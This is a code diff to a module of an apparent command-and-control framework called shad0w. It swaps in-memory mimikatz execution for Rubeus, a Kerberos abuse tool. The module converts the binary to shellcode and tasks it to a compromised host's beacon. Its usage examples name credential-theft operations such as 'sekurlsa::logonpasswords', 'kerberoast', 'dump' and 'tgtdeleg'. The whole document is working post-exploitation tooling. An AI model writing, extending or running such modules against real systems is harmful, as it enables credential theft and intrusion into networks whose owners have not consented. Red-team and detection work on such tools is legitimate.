@@ -1,25 +1,24 @@
 #
-# Execute mimikatz on a session
+# Execute rubeus on a session
 #
 
 import argparse
 
 from lib import shellcode
 
-__description__ = "Execute mimikatz commands in memory on the target"
+__description__ = "A toolset for raw Kerberos interaction and abuses"
 
 # identify the task as shellcode execute
 USERCD_EXEC_ID = 0x3000
 
-# location of mimikatz binary
-MIMIKATZ_BIN = "/root/shad0w/bin/mimikatz.x64.exe"
+# location of rubeus binary
+RUBEUS_BIN = "/root/shad0w/bin/Rubeus.x86.exe"
 
 # did the command error
 ERROR = False
 error_list = ""
 
 # let argparse error and exit nice
-
 def error(message):
     global ERROR, error_list
     ERROR = True
@@ -29,14 +28,7 @@ def exit(status=0, message=None):
     if message != None: print(message)
     return
 
-def mimikatz_callback(shad0w, data):
-    data = data.replace(".#####.", "\033[1;32m.#####.\033[0m")
-    data = data.replace(".## ^ ##.", "\033[1;32m.##\033[0m \033[1;39m^\033[0m \033[1;32m##.\033[0m")
-    data = data.replace("## / \\ ##", "\033[1;32m##\033[0m \033[1;39m/ \\\033[1;32m \033[1;32m##\033[0m")
-    data = data.replace("## \\ / ##", "\033[1;32m##\033[0m \033[1;39m\\ /\033[1;32m \033[1;32m##\033[0m")
-    data = data.replace("'## v ##'", "\033[1;32m'##\033[0m \033[1;39mv\033[1;32m \033[1;32m##'\033[0m")
-    data = data.replace("'#####'", "\033[1;32m'#####'\033[0m")
-
+def rubeus_callback(shad0w, data):
     print(data)
 
     return ""
@@ -50,16 +42,15 @@ def main(shad0w, args):
 
     # usage examples
     usage_examples = """
-
-Examples:
-
-mimikatz
-mimikatz -x coffee
-mimikatz -x sekurlsa::logonpasswords
+rubeus -x kerberoast
+rubeus -x klist
+rubeus -x dump
+rubeus -x tgtdeleg
+rubeus -x help
 """
 
     # init argparse
-    parse = argparse.ArgumentParser(prog='mimikatz',
+    parse = argparse.ArgumentParser(prog='rubeus',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=usage_examples)
 
@@ -68,8 +59,7 @@ mimikatz -x sekurlsa::logonpasswords
     parse.error = error
 
     # set the args
-    parse.add_argument("-x", "--execute", nargs='+', required=True, help="Mimikatz command to execute")
-    parse.add_argument("-n", "--no-exit", action="store_true", required=False, help="Leave mimikatz running")
+    parse.add_argument("-x", "--execute", nargs='+', required=True, help="Rubeus command to execute")
 
     # make sure we dont die from weird args
     try:
@@ -79,24 +69,21 @@ mimikatz -x sekurlsa::logonpasswords
 
     # show the errors to the user
     if not args.execute:
-        print(error_list) 
+        print(error_list)
         parse.print_help()
         return
-    
+
     if args.execute:
         params = ' '.join(args.execute)
 
-        if not args.no_exit:
-            params = params + " exit"
-        
-        # kinda a hack to make sure we intergrate nice with the shellcode generator 
+        # kinda a hack to make sure we intergrate nice with the shellcode generator
         args.param = args.execute
         args.cls = False
         args.method = False
         args.runtime = False
         args.appdomain = False
 
-        b64_comp_data = shellcode.generate(MIMIKATZ_BIN, args, params)
-    
+        b64_comp_data = shellcode.generate(RUBEUS_BIN, args, params)
+
     shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
-    shad0w.beacons[shad0w.current_beacon]["callback"] = mimikatz_callback
+    shad0w.beacons[shad0w.current_beacon]["callback"] = rubeus_callback
